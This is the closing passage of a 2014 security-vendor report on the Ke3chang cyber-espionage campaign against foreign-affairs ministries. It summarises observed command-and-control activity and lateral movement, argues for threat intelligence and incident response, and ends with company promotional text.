Ke3chang attackers have been active \nsince at least 2010 and have attacked targets \nrelated to G20 meetings in the past.\nDuring our investigation, we were able to observe \nthe inner workings of one of the CnC servers  \nused by the attackers. As a result, we were able to \nidentify some of the victims of the attack, as well \nas gather circumstantial evidence that indicates \nthat the attackers may be operating from China.Figure 18:  \nTest CnC output \ngenerated by the \nKe3chang actor \nafter infecting \ntheir test \nendpoints with \nBS2005 malware\nOperation “Ke3chang”: T argeted Attacks Against Ministries of Foreign AffairsFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com   |  www.fireeye.com\n© 2014  FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, \nInc. All other brands, products, or service names are or may be trademarks or service \nmarks of their respective owners.  RPT.ATR.EN-US.082014During our brief window of visibility into one of \nthe known 22 CnC nodes, FireEye observed the \nattackers conducting reconnaissance and moving \nlaterally throughout the compromised networks. \nRelevant authorities were immediately notified \nupon this discovery, and FireEye began its \nworldwide target notification process. At that \ntime, FireEye did not observe the attackers \nexfiltrating sensitive data; however, we believe  \nthe Ke3chang attackers likely began attempting  \nto exfiltrate sensitive data  shortly thereafter.\nAccordingly, diplomatic missions, including \nministries of foreign affairs, continue to be target -\ned by malware-based espionage campaigns.\nThis report demonstrates that attackers are able to \nsuccessfully penetrate government targets using \nexploits for vulnerabilities that have already been \npatched and despite the fact that these ministries \nhave defenses in place. This illustrates the limitations \nof traditional defenses and highlights the need for \nsecurity strategies that not only leverage advanced \ntechnologies designed to defend against targeted \nthreats, but also the incorporation of threat \nintelligence and an incident response capability.\nT o learn more about FireEye, visit www.FireEye.com .About FireEye, Inc.  \nFireEye has invented a purpose-built, virtual \nmachine-based security platform that provides \nreal-time threat protection to enterprises and \ngovernments worldwide against the next genera -\ntion of cyber attacks. These highly sophisticated \ncyber attacks easily circumvent traditional \nsignature-based defenses, such as next-generation \nfirewalls, IPS, anti-virus, and gateways. The FireEye \nThreat Prevention Platform provides real-time, \ndynamic threat protection without the use of \nsignatures to protect an organization across the \nprimary threat vectors, including mobile, Web, \nemail, and files and across the different stages of an \nattack life cycle. The core of the FireEye platform  \nis a  virtual execution engine, complemented by \ndynamic threat intelligence, to identify and block \ncyber attacks in real time. FireEye has over 1,300 \ncustomers across more than 40 countries, \nincluding over 100 of the Fortune 500."
}